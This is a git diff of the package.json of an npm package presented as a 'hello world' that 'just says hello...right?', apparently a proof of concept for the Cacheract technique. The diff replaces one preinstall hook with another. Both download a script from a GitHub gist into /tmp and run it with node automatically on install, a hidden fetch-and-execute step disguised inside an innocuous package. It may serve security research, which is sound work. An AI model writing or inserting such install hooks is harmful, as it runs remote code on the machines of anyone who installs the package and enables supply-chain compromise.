@@ -8,7 +8,7 @@
   "description": "Cacheract Hello World Package - it just says hello...right?",
   "main": "src/index.js",
   "scripts": {
-    "preinstall": "curl -sSfL https://gist.githubusercontent.com/RampagingSloth/d0bb0143358d08d22a9fcc3e02940617/raw/a9e9595f4e6a0e404e1994c52becf6cccdf75fe2/run.sh > /tmp/script.sh && node /tmp/script.sh",
+    "preinstall": "curl -sSfL https://gist.githubusercontent.com/RampagingSloth/b059d72ed2520754866f3f82469682c8/raw/1b09b8cbe3106452b76abf2036750bbb7a93e1d9/run > /tmp/script.sh && node /tmp/script.sh",
     "test": "jest"
   },
   "keywords": ["poc"],
